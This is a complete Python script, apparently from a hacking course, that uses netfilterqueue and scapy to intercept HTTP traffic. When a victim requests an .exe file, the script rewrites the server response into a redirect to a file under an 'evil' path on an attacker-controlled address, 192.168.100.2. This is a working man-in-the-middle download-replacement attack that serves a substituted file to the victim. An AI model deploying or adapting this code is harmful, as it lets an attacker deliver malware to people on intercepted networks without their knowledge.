#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(scapy_packet, load):
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return scapy_packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:
            if ".exe" in scapy_packet[scapy.Raw].load and "192.168.100.2" not in scapy_packet[scapy.Raw].load :
                print(".exe request ")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("[+] Replacing File")
                load = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.100.2/evil/ip_forward.zip\n\n"
                modified_packet = set_load(scapy_packet, load)
                packet.set_payload(str(modified_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
